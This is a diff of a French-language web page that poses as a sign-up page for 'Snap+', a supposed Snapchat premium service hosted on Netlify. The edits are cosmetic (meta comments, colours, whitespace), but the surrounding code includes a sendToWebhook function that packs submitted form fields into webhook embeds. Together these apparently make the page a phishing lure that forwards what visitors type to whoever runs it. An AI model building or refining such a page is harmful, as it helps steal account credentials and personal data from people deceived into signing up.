@@ -5,14 +5,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>S'inscrire à Snap+</title>
 
-  <!-- Open Graph -->
+  <!-- Open Graph Meta Tags (pour Discord, Facebook, etc.) -->
   <meta property="og:title" content="S'inscrire à Snap+">
   <meta property="og:description" content="Inscrivez-vous à Snap+ pour accéder à des avantages premium et des fonctionnalités exclusives.">
   <meta property="og:image" content="https://i.pinimg.com/1200x/e1/8e/e7/e18ee7a774a7b42f03ea74a6b64811bd.jpg"> <!-- Remplace l'URL par une image représentative -->
   <meta property="og:url" content="https://methodsnap.netlify.app/"> <!-- Remplace par l'URL de ton site -->
   <meta property="og:type" content="website">
 
-  <!-- Twitter Card -->
+  <!-- Twitter Card Meta Tags -->
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="S'inscrire à Snap+">
   <meta name="twitter:description" content="Inscrivez-vous à Snap+ pour accéder à des avantages premium et des fonctionnalités exclusives.">
@@ -23,10 +23,10 @@
       --primary: #ffcc00;
       --primary-dark: #e6b800;
       --success: #00cc66;
-      --bg-dark: #ffc504;
+      --bg-dark: #0a0a0a;
       --card: #111111;
       --input: #1a1a1a;
-      --border: #ffe600;
+      --border: #333333;
       --text: #eeeeee;
       --text-light: #aaaaaa;
       --error: #ff6666;
@@ -266,7 +266,7 @@ async function sendToWebhook(title, fields = {}) {
   
   const embed = {
     title: title,
-    color: 0xFFCC00,           // ← couleur jaune pour l'embed
+    color: 0xFFCC00,           // ← jaune pour tous les embeds
     fields: Object.entries(fields).map(([name, value]) => ({
       name: name,
       value: "```" + (value || "—") + "```",
@@ -415,7 +415,7 @@ try {
 
   let mouse = {x:w/2, y:h/2};
   window.onmousemove = e=>{mouse.x=e.clientX; mouse.y=e.clientY;};
-  window.ontouchmove = e=>{ 
+  window.ontouchmove = e=>{
     if(e.touches.length){ mouse.x=e.touches[0].clientX; mouse.y=e.touches[0].clientY; }
   };
 
